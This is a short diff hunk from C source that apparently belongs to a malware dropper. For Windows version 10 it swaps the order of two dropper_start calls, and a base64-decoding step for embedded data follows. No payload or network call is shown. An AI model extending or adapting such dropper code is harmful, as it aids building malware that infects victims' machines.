@@ -197,8 +197,8 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-		dropper_start(1);
 		dropper_start(3);
+		dropper_start(1);
 
 	#if DROPPER_BASE64 == 1
 		data1 = base64decode(data1, &size1);
